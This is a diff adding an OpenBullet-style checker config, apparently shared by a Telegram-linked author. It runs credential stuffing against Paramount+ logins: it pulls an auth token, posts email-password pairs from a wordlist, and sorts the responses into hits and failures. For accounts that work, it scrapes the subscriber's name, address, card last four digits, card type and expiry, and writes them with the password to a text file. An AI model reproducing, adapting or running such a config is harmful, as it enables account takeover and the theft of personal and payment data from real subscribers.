@@ -1,0 +1,118 @@
+[SETTINGS]
+{
+  "Name": "paramount+😈Thelokojo04.08",
+  "SuggestedBots": 180,
+  "MaxCPM": 0,
+  "LastModified": "2022-08-04T15:57:32.2043661-05:00",
+  "AdditionalInfo": "https://t.me/Thelokojovip",
+  "Author": "@Thelokojo_vip",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOKURA1 REQUEST GET "https://www.paramountplus.com/co/signin/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#LOKURA PARSE "<SOURCE>" LR "CBS.Registry.login.authToken = '" "';" -> VAR "LOKURA" 
+
+#LOGIN REQUEST POST "https://www.paramountplus.com/co/aa-app-xhr/login/" Multipart 
+  
+  STRINGCONTENT "email: <USER>" 
+  STRINGCONTENT "password: <PASS>" 
+  STRINGCONTENT "tk_trp: <LOKURA>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
+  HEADER "Origin: https://www.paramountplus.com" 
+  HEADER "Referer: https://www.paramountplus.com/co/signin/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#PLAN PARSE "<SOURCE>" LR "planTitle\":\"" "\"," CreateEmpty=FALSE -> CAP "PLAN" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "El correo electr\\u00f3nico y\\/o la contrase\\u00f1a no son v\\u00e1lidos" 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "displayName" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "status\":\"REGISTERED" 
+    KEY "EX_SUBSCRIBER" 
+    KEY "status\":\"MVPD_AUTHZ" 
+
+#LOKURA2 REQUEST GET "https://www.paramountplus.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#SERENUEVA PARSE "<SOURCE>" LR "next_bill_date_str\":\"" "\"}," CreateEmpty=FALSE -> CAP "SERENUEVA" 
+
+#NOMBRE PARSE "<SOURCE>" LR "\":{\"first_name\":\"" "\"," CreateEmpty=FALSE -> CAP "NOMBRE" 
+
+#APELLIDO PARSE "<SOURCE>" LR "\",\"last_name\":\"" "\"," CreateEmpty=FALSE -> CAP "APELLIDO" 
+
+#DIRECCION PARSE "<SOURCE>" LR "address_1\":\"" "\"," CreateEmpty=FALSE -> CAP "DIRECCION" 
+
+#CIUDAD PARSE "<SOURCE>" LR "\":\"\",\"city\":\"" "\"," CreateEmpty=FALSE -> CAP "CIUDAD" 
+
+#ESTADO PARSE "<SOURCE>" LR "\"state\":\"" "\"," CreateEmpty=FALSE -> CAP "ESTADO" 
+
+#ZIP PARSE "<SOURCE>" LR "zip\":\"" "\"," CreateEmpty=FALSE -> CAP "ZIP" 
+
+#PAIS PARSE "<SOURCE>" LR "\",\"country\":\"" "\",\"" CreateEmpty=FALSE -> CAP "PAIS" 
+
+#4ULTCARDS PARSE "<SOURCE>" LR "lastFour\":\"" "\"," CreateEmpty=FALSE -> CAP "4ULTCARDS" 
+
+#CARDTYPE PARSE "<SOURCE>" LR "cardType\":\"" "\"," CreateEmpty=FALSE -> CAP "CARDTYPE" 
+
+#EXPYEAR PARSE "<SOURCE>" LR "cardExpYear\":" ",\"" CreateEmpty=FALSE -> CAP "EXPYEAR" 
+
+#EXPMONTH PARSE "<SOURCE>" LR "cardExpMonth\":" ",\"" CreateEmpty=FALSE -> CAP "EXPMONTH" 
+
+#PARAMOUNT✦.TXT UTILITY File "PARAMOUNT+THELOKOJO🎩.txt" AppendLines "\\n✦~~~~✦~~~~✦| Paramount+🎩Thelokojo |✦~~~~✦~~~~✦\\nCorreo: <USER>\\nContraseña: <PASS>\\nSERENUEVA: <SERENUEVA>\\nNOMBRE: <NOMBRE>\\nAPELLIDO: <APELLIDO>\\nDIRECCION: <DIRECCION>\\nESTADO: <ESTADO>\\nZIP: <ZIP>\\nPAIS: <PAIS>\\n4ULTCARDS: <4ULTCARDS>\\nCARDTYPE: <CARDTYPE>\\nEXPYEAR: <EXPYEAR>\\nEXPMONTH: <EXPMONTH>\\n" 
+
